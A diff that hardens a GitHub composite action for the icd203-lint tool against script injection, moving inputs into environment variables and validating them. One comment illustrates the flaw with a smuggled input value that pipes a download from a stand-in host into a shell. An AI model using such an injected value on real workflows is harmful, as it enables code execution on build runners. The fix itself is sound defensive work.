@@ -43,37 +43,98 @@ runs:
       with:
         python-version: '3.11'
 
+    # Every input is passed through `env:` and read as a shell variable, never
+    # interpolated into the script text with ${{ }}. GitHub expands ${{ }} into
+    # the run: body BEFORE bash runs, so a value like `1.0"; curl evil | sh; :"`
+    # in an input would become live script. Reading the same value from the
+    # environment (`$ICD203_VERSION`) hands bash a string, not source code:
+    # parameter expansion does not re-run command substitution, so injected
+    # metacharacters stay inert. Inputs are additionally validated below.
     - name: Install icd203-lint
       shell: bash
+      env:
+        ICD203_VERSION: ${{ inputs.version }}
       run: |
-        if [ -n "${{ inputs.version }}" ]; then
-          pip install "icd203-lint==${{ inputs.version }}"
+        set -euo pipefail
+        if [ -n "$ICD203_VERSION" ]; then
+          if ! printf '%s' "$ICD203_VERSION" | grep -Eq '^[A-Za-z0-9._-]+$'; then
+            echo "::error::Invalid version '$ICD203_VERSION'. Allowed: letters, digits, dot, underscore, hyphen." >&2
+            exit 1
+          fi
+          pip install "icd203-lint==$ICD203_VERSION"
         else
           pip install icd203-lint
         fi
 
     - name: Run icd203-lint
       shell: bash
+      env:
+        ICD203_PATHS: ${{ inputs.paths }}
+        ICD203_SEVERITY: ${{ inputs.severity }}
+        ICD203_FORMAT: ${{ inputs.format }}
+        ICD203_SELECT: ${{ inputs.select }}
+        ICD203_IGNORE: ${{ inputs.ignore }}
+        ICD203_FAIL_ON_FINDINGS: ${{ inputs.fail-on-findings }}
       run: |
-        ARGS=""
-        if [ -n "${{ inputs.select }}" ]; then
-          for r in $(echo "${{ inputs.select }}" | tr ',' ' '); do
-            ARGS="$ARGS --select $r"
+        set -uo pipefail
+
+        # --- validate the enum / boolean inputs -----------------------------
+        case "$ICD203_SEVERITY" in
+          info|warn|error) ;;
+          *) echo "::error::severity must be one of: info, warn, error (got '$ICD203_SEVERITY')." >&2; exit 1 ;;
+        esac
+        case "$ICD203_FORMAT" in
+          github|sarif|text) ;;
+          *) echo "::error::format must be one of: github, sarif, text (got '$ICD203_FORMAT')." >&2; exit 1 ;;
+        esac
+        case "$ICD203_FAIL_ON_FINDINGS" in
+          true|false) ;;
+          *) echo "::error::fail-on-findings must be 'true' or 'false' (got '$ICD203_FAIL_ON_FINDINGS')." >&2; exit 1 ;;
+        esac
+
+        # --- build argv as an array: each value is one argument, never re-parsed
+        args=( --severity "$ICD203_SEVERITY" --format "$ICD203_FORMAT" )
+
+        if [ -n "$ICD203_SELECT" ]; then
+          IFS=',' read -ra sel <<< "$ICD203_SELECT"
+          for raw in "${sel[@]}"; do
+            [[ "$raw" =~ ^[[:space:]]*$ ]] && continue
+            if [[ "$raw" =~ ^[[:space:]]*([A-Za-z0-9_-]+)[[:space:]]*$ ]]; then
+              args+=( --select "${BASH_REMATCH[1]}" )
+            else
+              echo "::error::Invalid rule id in select: '$raw'. Allowed: letters, digits, underscore, hyphen." >&2
+              exit 1
+            fi
           done
         fi
-        if [ -n "${{ inputs.ignore }}" ]; then
-          for r in $(echo "${{ inputs.ignore }}" | tr ',' ' '); do
-            ARGS="$ARGS --ignore $r"
+
+        if [ -n "$ICD203_IGNORE" ]; then
+          IFS=',' read -ra ign <<< "$ICD203_IGNORE"
+          for raw in "${ign[@]}"; do
+            [[ "$raw" =~ ^[[:space:]]*$ ]] && continue
+            if [[ "$raw" =~ ^[[:space:]]*([A-Za-z0-9_-]+)[[:space:]]*$ ]]; then
+              args+=( --ignore "${BASH_REMATCH[1]}" )
+            else
+              echo "::error::Invalid rule id in ignore: '$raw'. Allowed: letters, digits, underscore, hyphen." >&2
+              exit 1
+            fi
           done
         fi
+
+        # paths is a space-separated list; split into argv without glob surprises.
+        set -f
+        read -ra path_args <<< "$ICD203_PATHS"
+        set +f
+        if [ "${#path_args[@]}" -eq 0 ]; then
+          path_args=( "." )
+        fi
+
         set +e
-        icd203-lint ${{ inputs.paths }} \
-          --severity ${{ inputs.severity }} \
-          --format ${{ inputs.format }} \
-          $ARGS
+        icd203-lint "${path_args[@]}" "${args[@]}"
         rc=$?
         set -e
-        if [ "${{ inputs.fail-on-findings }}" = "true" ] && [ "$rc" -ne 0 ]; then
-          exit $rc
+
+        if [ "$ICD203_FAIL_ON_FINDINGS" = "true" ] && [ "$rc" -ne 0 ]; then
+          exit "$rc"
         fi
         exit 0
